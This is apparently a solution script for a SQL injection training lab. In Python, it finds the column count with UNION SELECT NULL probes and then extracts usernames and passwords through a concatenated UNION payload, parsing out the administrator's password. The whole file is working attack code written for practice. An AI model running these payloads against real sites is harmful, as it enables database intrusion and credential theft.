import requests as r
from time import sleep


# lab name:SQL injection UNION attack, retrieving multiple values in a single column

# we have some clues : 
# table name : user  , columns names username and password 

link = "" # without the last backslash
vuln_path ="/filter?category=Gifts"

def found_columns():
    
    col = 0
    response ="Error"
    payload="\' union select "
    while "Error" in  response : 
        if col == 0:
            payload += "null"
        else:
            payload+=",null"
        finalLink = link+vuln_path+payload + " --"
        col+=1
        my_req = r.get(finalLink)
        response = my_req.text
        print(finalLink)
        
        sleep(0.4)

    print("Found {} columns".format(col))
    return col




#number_col = found_columns() # return us 2 columns

# the lab name is pretty clear we cannot use the previous technique : 
# ' union  select username,password from users --
# because the current query had only one columns in the string data type
# we found this using enumeration : 
# ' union select 'a', null --   => error
# ' union select null , 'a'     => fine 
# so we can use only the second columns in order to exfiltrate username,password

# in order to retrieve the username and password we are going to use || operator and concatenate
# username and password in the second column 

def concatenate():

    payload = "\' union select null,username ||\'-\'|| password from users --" # concat separate by -

    full_link = link + vuln_path + payload
    my_req = r.get(full_link)

    response = ((my_req.text).split('administrator-')[1]).split("</th>")[0]

    print(response)


concatenate()